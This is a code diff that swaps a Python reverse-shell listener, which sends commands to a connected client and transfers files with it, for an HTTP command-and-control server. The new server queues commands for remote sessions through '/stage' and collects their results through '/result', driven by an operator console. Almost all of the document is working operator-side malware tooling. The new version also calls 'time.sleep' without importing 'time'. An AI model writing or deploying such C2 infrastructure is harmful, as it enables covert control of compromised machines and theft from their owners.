@@ -1,106 +1,55 @@
-import socket
-import json
-import base64
-from colorama import Fore, Style, init
+# handler.py
+from http.server import BaseHTTPRequestHandler, HTTPServer
+import threading
 
-# Initialize colorama
-init(autoreset=True)
+HOST = '0.0.0.0'
+PORT = 8000
 
-# Server configuration
-HOST = "0.0.0.0"  # Replace with your server's IP address
-PORT = 4444  # Replace with your desired port
+session_cmds = {}
+session_results = {}
 
-# Function to send JSON data
-def send_json(sock, data):
-    json_data = json.dumps(data)
-    sock.sendall(json_data.encode())
+class C2Handler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        session_id = self.headers.get("X-Session-ID", "unknown")
+        if self.path == "/stage":
+            cmd = session_cmds.get(session_id, "")
+            self.send_response(200)
+            self.send_header("Content-type", "text/plain")
+            self.end_headers()
+            self.wfile.write(cmd.encode())
 
-# Function to receive JSON data
-def receive_json(sock):
-    json_data = ""
+    def do_POST(self):
+        session_id = self.headers.get("X-Session-ID", "unknown")
+        if self.path == "/result":
+            content_length = int(self.headers['Content-Length'])
+            post_data = self.rfile.read(content_length).decode()
+            session_results[session_id] = post_data
+            self.send_response(200)
+            self.end_headers()
+
+def console():
     while True:
-        try:
-            json_data += sock.recv(1024).decode()
-            return json.loads(json_data)
-        except ValueError:
+        if session_cmds:
+            print("\n[+] Active sessions:")
+            for sid in session_cmds:
+                print(f"  {sid}")
+        sid = input("\nSelect session ID (or type 'refresh'): ").strip()
+        if sid == "refresh":
             continue
-
-# Function to read a file and encode it in base64
-def read_file(path):
-    try:
-        with open(path, "rb") as file:
-            return base64.b64encode(file.read()).decode()
-    except FileNotFoundError:
-        return "[+] Error: File not found [+]"
-    except Exception as e:
-        return f"[+] Error: {e} [+]"
-
-# Function to write a file from base64 encoded content
-def write_file(path, content):
-    try:
-        with open(path, "wb") as file:
-            file.write(base64.b64decode(content))
-            return "[+] Download successful [+]"
-    except Exception as e:
-        return f"[+] Error: {e} [+]"
-
-# Set up the server
-server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-server.bind((HOST, PORT))
-server.listen(5)
-
-print(Fore.GREEN + "Starting TCP Handler...")
-print(Fore.YELLOW + f"Server listening on {Fore.CYAN}{HOST}:{PORT}")
-
-client_socket, client_address = server.accept()
-print(Fore.GREEN + f"Connection established with {client_address}")
-
-try:
-    while True:
-        prompt = client_socket.recv(1024).decode("utf-8")
-        print(Fore.CYAN + prompt, end="")
-        command = input()
-
-        if command.lower() == "km":
-            print(Fore.RED + "Disconnecting from client...")
-            client_socket.close()
-            break
-
-        # Handle the 'upload' command
-        if command.startswith("upload"):
-            try:
-                _, filename = command.split(" ", 1)
-                send_json(client_socket, {"command": "upload", "filename": filename})
-                response = receive_json(client_socket)
-                if "Error" in response:
-                    print(Fore.RED + response)
-                else:
-                    result = write_file(filename, response)
-                    print(Fore.GREEN + result)
-            except Exception as e:
-                print(Fore.RED + f"[+] Error: {str(e)} [+]")
+        if sid not in session_cmds:
+            print("[!] Session not found.")
             continue
+        while True:
+            cmd = input(f"{sid}> ").strip()
+            if cmd == "back":
+                break
+            session_cmds[sid] = cmd
+            time.sleep(2)
+            result = session_results.get(sid, "[*] No response.")
+            print(result)
 
-        # Handle the 'download' command
-        if command.startswith("download"):
-            try:
-                _, filename = command.split(" ", 1)
-                send_json(client_socket, {"command": "download", "filename": filename})
-                response = receive_json(client_socket)
-                if "Error" in response:
-                    print(Fore.RED + response)
-                else:
-                    result = write_file(filename, response)
-                    print(Fore.GREEN + result)
-            except Exception as e:
-                print(Fore.RED + f"[+] Error: {str(e)} [+]")
-            continue
-
-        send_json(client_socket, command)
-        output = client_socket.recv(4096).decode("utf-8")
-        print(Fore.WHITE + output)
-
-except KeyboardInterrupt:
-    print(Fore.RED + "\nShutting down the server.")
-    client_socket.close()
-    server.close()
+if __name__ == "__main__":
+    server = HTTPServer((HOST, PORT), C2Handler)
+    print(f"[*] Listening on port {PORT}...")
+    threading.Thread(target=server.serve_forever, daemon=True).start()
+    console()
